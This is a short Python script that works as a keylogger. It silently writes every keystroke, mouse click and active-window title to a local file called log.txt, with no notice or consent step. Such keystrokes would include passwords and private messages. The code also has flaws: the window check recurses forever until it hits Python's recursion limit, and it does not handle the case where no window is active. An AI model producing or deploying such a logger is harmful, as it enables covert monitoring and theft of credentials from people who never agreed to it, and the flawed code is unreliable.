from pynput import keyboard, mouse
import pygetwindow as gw
import time


# Define a function to write to the log file
def write_to_log(log_text):
    with open("log.txt", "a") as f:
        f.write(log_text + "\n")


# Define a function to handle key presses
def on_press(key):
    try:
        write_to_log("Key pressed: {0}".format(key.char))
    except AttributeError:
        write_to_log("Special key pressed: {0}".format(key))


# Define a function to handle mouse clicks
def on_click(x, y, button, pressed):
    if pressed:
        write_to_log("Mouse clicked at ({0}, {1}) with {2}".format(x, y, button))


# Define a function to check for window changes
def check_window_changes():
    active_window = gw.getActiveWindow()
    if active_window != check_window_changes.last_active_window:
        write_to_log("Window changed: {0}".format(active_window.title))
        check_window_changes.last_active_window = active_window
    # Check every 2 seconds
    time.sleep(2)
    check_window_changes()


check_window_changes.last_active_window = None

# Create listeners for keyboard and mouse events
keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener = mouse.Listener(on_click=on_click)

# Start the listeners
keyboard_listener.start()
mouse_listener.start()

# Start checking for window changes
check_window_changes()

# Join the listeners to the main thread
keyboard_listener.join()
mouse_listener.join()
